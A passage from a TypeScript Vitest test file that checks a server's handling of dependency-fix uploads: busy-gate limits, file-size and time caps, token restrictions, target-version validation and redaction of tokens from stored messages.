    // The holder's upload names its own package; it is held while main's ancestry is read.
    const first = result(
      holder.id,
      upload(holder, { baseSha: fake.pushAs(GITLAB_ID, 'side', {}) }),
    );
    await vi.waitFor(() =>
      expect(fake.requests.some((r) => r.path.endsWith('/merge_base'))).toBe(true),
    );
    expect(fixCheckGate.admitted).toBe(1);
    const before = await row(second.id);
    const seen = fake.requests.length;
    const busy = await result(second.id, upload(second));
    expect(problem(busy)).toEqual([503, 'FIX_CHECK_BUSY', null]);
    expect(busy.headers['retry-after']).toBe('10');
    expect(fake.requests).toHaveLength(seen);
    expect(await row(second.id)).toEqual(before);

    open();
    expect((await first).statusCode).toBe(422);
    expect(fixCheckGate.admitted).toBe(0);
    // The same upload again, on its still valid lease: accepted.
    const again = await result(second.id, upload(second));
    expect(again.statusCode, again.body).toBe(202);
    expect((await row(second.id)).state).toBe('committing');
  });

  it('at most eight uploads wait behind the running check (ruling T9a): the next one is 503', async () => {
    const item = await claimQfA();
    const places = Array.from({ length: 9 }, () => fixCheckGate.admit(randomUUID()));
    try {
      expect(places.every((p) => 'release' in p)).toBe(true);
      fake.clearRequests();
      const before = await row(item.id);
      const busy = await result(item.id, upload(item));
      expect(problem(busy)).toEqual([503, 'FIX_CHECK_BUSY', null]);
      expect(busy.headers['retry-after']).toBe('10');
      expect(fake.requests).toEqual([]);
      expect(await row(item.id)).toEqual(before);
      const [one] = places;
      if (one !== undefined && 'release' in one) one.release();
      const res = await result(item.id, upload(item));
      expect(res.statusCode, res.body).toBe(202);
    } finally {
      for (const place of places) if ('release' in place) place.release();
    }
    expect(fixCheckGate.admitted).toBe(0);
  });

  it('a project unbound or a connection no longer allowed meanwhile: 409, the fix stays preparing', async () => {
    const item = await claimQfA();
    await db()
      .update(scmConnections)
      .set({ fixMrsAllowed: false })
      .where(eq(scmConnections.id, project.connectionId));
    expect(problem(await result(item.id, upload(item)))).toEqual([
      409,
      'FIX_MRS_NOT_ALLOWED',
      null,
    ]);
    expect((await row(item.id)).state).toBe('preparing');
    expect(fake.requests).toEqual([]);
  });

  it('a tiny time cap refuses the upload as unparsable on its largest file (ruling T3k)', async () => {
    const item = await claimQfA();
    const fix = await row(item.id);
    const scm = { secretKey: h.ctx.config.secretKey, internalHosts: h.ctx.config.scmInternalHosts };
    const [projectOf] = await db().select().from(projects).where(eq(projects.id, projectId));
    const warned: unknown[] = [];
    const attempt = acceptFixResult(
      { db: db(), scm },
      fix,
      projectOf!,
      fixResultBodySchema.parse(upload(item)),
      { check: { timeoutMs: 1 }, log: { warn: (fields) => void warned.push(fields) } },
    );
    await expect(attempt).rejects.toBeInstanceOf(ProblemError);
    const error = (await attempt.catch((e: unknown) => e)) as ProblemError;
    expect([error.status, error.code, error.extensions.reason, error.detail]).toEqual([
      422,
      'UPLOAD_REFUSED',
      'unparsable',
      'package-lock.json',
    ]);
    expect(warned).toEqual([{ fixId: item.id, gaveUp: 'timeout' }]);
    expect(await row(item.id)).toMatchObject({
      state: 'failed',
      failure: {
        code: 'upload_refused',
        message: 'A changed file cannot be read in its format. File: package-lock.json',
      },
    });
    expect(await fixJobs()).toEqual([]);
  });

  it('base files over the limit together are too_large, read no further (fix round 1, I1)', async () => {
    const item = await claimQfA();
    const fix = await row(item.id);
    fake.clearRequests();
    const error = (await acceptFixResult(
      scmDeps(),
      fix,
      await projectRow(),
      fixResultBodySchema.parse(upload(item)),
      { maxBaseBytes: Buffer.byteLength(packageJson('^1.2.5')) - 1 },
    ).catch((e: unknown) => e)) as ProblemError;
    expect([error.status, error.code, error.extensions.reason, error.detail]).toEqual([
      422,
      'UPLOAD_REFUSED',
      'too_large',
      'package.json',
    ]);
    // The first base passed the limit: neither its head copy nor the lockfile was read.
    expect(fake.requests.filter((r) => r.path.endsWith('/raw')).map((r) => r.path)).toEqual([
      `/projects/${GITLAB_ID}/repository/files/package.json/raw`,
    ]);
    expect(await row(item.id)).toMatchObject({
      state: 'failed',
      failure: { code: 'upload_refused' },
      leaseTokenHash: null,
    });
    expect(await fixJobs()).toEqual([]);
    expect(writes()).toEqual([]);
  });

  it('one upload check per organisation (ruling T9e): its other project is 503, another organisation is admitted', async () => {
    const item = await claimQfA();
    const open = holdMergeBase();
    const first = result(item.id, upload(item, { baseSha: fake.pushAs(GITLAB_ID, 'side', {}) }));
    await vi.waitFor(() => expect(fixCheckGate.admitted).toBe(1));
    const lease = 'a-lease-of-another-project';
    const preparing = (id: string) =>
      seedFix(db(), {
        projectId: id,
        family: 'js',
        packageName: 'qf-a',
        state: 'preparing',
        leaseTokenHash: sha256(lease),
      });
    const body = { ...upload(item), generation: 1, leaseToken: lease };
    const sibling = await preparing(big.id);
    const busy = await result(sibling, body, bearer(big.token));
    expect(problem(busy)).toEqual([503, 'FIX_CHECK_BUSY', null]);
    expect((await row(sibling)).state).toBe('preparing');
    // A project of another organisation gets past the gate (and is refused on its own merits).
    const foreign = await otherOrganizationProject();
    const theirs = await preparing(foreign.id);
    const admitted = await result(theirs, body, bearer(foreign.token));
    expect(problem(admitted)).toEqual([422, 'UPLOAD_REFUSED', 'not_vulnerable']);
    open();
    expect((await first).statusCode).toBe(422);
    expect(fixCheckGate.admitted).toBe(0);
  });

  it('the read phase has a deadline (ruling T9e): past it 503, the fix preparing, the place given back', async () => {
    const item = await claimQfA();
    const fix = await row(item.id);
    const open = holdMergeBase();
    const projectOf = await projectRow();
    const started = performance.now();
    const error = (await acceptFixResult(
      scmDeps(),
      fix,
      projectOf,
      fixResultBodySchema.parse(upload(item, { baseSha: fake.pushAs(GITLAB_ID, 'side', {}) })),
      { readDeadlineMs: 300 },
    ).catch((e: unknown) => e)) as ProblemError;
    // The deadline, not the client's own 10 s timeout of the held request, ended the reads.
    expect(performance.now() - started).toBeLessThan(5_000);
    expect([error.status, error.code, error.headers['retry-after']]).toEqual([
      503,
      'SCM_UNAVAILABLE',
      '10',
    ]);
    expect(fixCheckGate.admitted).toBe(0);
    expect(await row(item.id)).toEqual(fix);
    open();
    const res = await result(item.id, upload(item));
    expect(res.statusCode, res.body).toBe(202);
  });

  it('anything but a project token is refused before the body is read (ruling T9f)', async () => {
    const headers = { ...(await personalToken()), 'content-type': 'application/json' };
    const put = await h.ctx.app.inject({
      method: 'PUT',
      url: `/api/v0/fixes/${randomUUID()}/result`,
      headers,
      payload: '{ not json',
    });
    expect(problem(put)).toEqual([403, 'TOKEN_NOT_ALLOWED', null]);
    const post = await h.ctx.app.inject({
      method: 'POST',
      url: `/api/v0/projects/fixes/claim?projectKey=${project.key}`,
      headers,
      payload: '{ not json',
    });
    expect(problem(post)).toEqual([403, 'TOKEN_NOT_ALLOWED', null]);
  });

  it('a target must be above its installed version, whatever the server chooses (ruling T9g)', async () => {
    const name = fresh();
    await vulnerable(name);
    // 1.3.0 is vulnerable with no fixed version: the server chooses no target for it.
    await vulnerable(name, { vulnerabilityId: 'GHSA-none', version: '1.3.0', fixedVersion: null });
    const item = await claimPackage(name);
    fake.clearRequests();
    const res = await result(
      item.id,
      upload(item, {
        installedVersion: '1.3.0',
        targetVersion: '1.3.0',
        targets: [{ installed: '1.3.0', target: '1.3.0', lockfile: 'package-lock.json' }],
      }),
    );
    await refused(item, res, 'target_mismatch');
    expect(fake.requests).toEqual([]);
  });

  it('lockfile lines name uploaded files; unknown unfixable ids are dropped (ruling T9h)', async () => {
    const item = await claimQfA();
    const res = await result(
      item.id,
      upload(item, {
        lockfiles: [
          {
            path: 'apps/web/package-lock.json',
            relation: 'direct',
            mechanism: null,
            dependents: [],
          },
        ],
      }),
    );
    await refused(item, res, 'target_mismatch');

    const next = await claimQfA();
    const ok = await result(next.id, upload(next, { unfixable: [CVE, 'CVE-2000-0001'] }));
    expect(ok.statusCode, ok.body).toBe(202);
    expect((await row(next.id)).prepared!.unfixable).toEqual([CVE]);
  });

  it('every uploaded lockfile is named by a target, go.sum through its go.mod (ruling T9i)', async () => {
    const item = await claimQfA();
    fake.clearRequests();
    const res = await result(
      item.id,
      upload(item, {
        files: [
          ...upload(item).files,
          { path: 'npm-shrinkwrap.json', content: b64(packageLock('1.2.6')) },
        ],
      }),
    );
    await refused(item, res, 'target_mismatch');
    expect(res.json().detail).toBe('npm-shrinkwrap.json');
    expect(fake.requests).toEqual([]);

    // Go: a target on go.mod covers its go.sum.
    await vulnerable(GO_PKG, {
      ecosystem: 'gomod',
      version: 'v1.2.5',
      fixedVersion: 'v1.2.6',
      vulnerabilityId: 'GO-2026-0001',
    });
    await seedFix(db(), { projectId, family: 'go', packageName: GO_PKG });
    const go = (await claimed({ families: ['go'], max: 1 })).items[0]!;
    const accepted = await result(
      go.id,
      upload(go, {
        installedVersion: 'v1.2.5',
        targetVersion: 'v1.2.6',
        targets: [{ installed: 'v1.2.5', target: 'v1.2.6', lockfile: 'go.mod' }],
        files: [
          { path: 'go.mod', content: b64(goMod('v1.2.6')) },
          { path: 'go.sum', content: b64(goSum('v1.2.6')) },
        ],
        lockfiles: [{ path: 'go.mod', relation: 'direct', mechanism: null, dependents: [] }],
      }),
    );
    expect(accepted.statusCode, accepted.body).toBe(202);
    expect((await row(go.id)).prepared!.additions).toEqual([
      {
        path: 'go.sum',
        entries: [
          { slot: null, name: GO_PKG, version: 'v1.2.6' },
          { slot: null, name: GO_PKG, version: 'v1.2.6/go.mod' },
        ],
      },
    ]);
  });

  it("scrubs the request's own token from a stored message (ruling T9j)", async () => {
    const item = await claimQfA();
    const res = await result(item.id, {
      generation: item.generation,
      leaseToken: item.leaseToken,
      failure: { code: 'package_manager', message: `sent ${project.token} to the registry\n` },
    });
    expect(res.statusCode, res.body).toBe(202);
    expect((await row(item.id)).failure!.message).toBe('sent [redacted] to the registry\n');
  });

  it('9 MiB base (Review Focus 2): a large package-lock.json on main and its upload are accepted', async () => {
    const bigMain = await mainBranchId(db(), big.id);
    await enableFixes(h, big.id);
    await vulnerable('qf-a', {}, { id: big.id, mainBranchId: bigMain });
    await seedFix(db(), { projectId: big.id, family: 'js', packageName: 'qf-a' });
    const answer = await claimed({ max: 1 }, bearer(big.token), big.key);
    const item = answer.items[0]!;
    const lock = packageLock('1.2.6', 52_000);
    expect(Buffer.byteLength(lock)).toBeGreaterThan(9 * 1024 * 1024);
    const res = await result(
      item.id,
      upload(item, {
        baseSha: head(BIG_GITLAB_ID),
        files: [
          { path: 'package.json', content: b64(packageJson('^1.2.6')) },
          { path: 'package-lock.json', content: b64(lock) },
        ],
      }),
      bearer(big.token),
    );
    expect(res.statusCode, res.body).toBe(202);
    const stored = await row(item.id);
    expect(stored.state).toBe('committing');
    expect(stored.prepared!.files[1]!.content).toBe(lock);
    expect(stored.prepared!.additions).toEqual([
      { path: 'package-lock.json', entries: [{ slot: null, name: 'qf-a', version: '1.2.6' }] },
    ]);
    // The base was read raw from the fake, whole.
    expect(
      fake.requests.some((r) => r.path.includes('package-lock.json') && r.path.endsWith('/raw')),
    ).toBe(true);
    await db().delete(targetVulnerabilities).where(eq(targetVulnerabilities.projectId, big.id));
  }, 120_000);
});
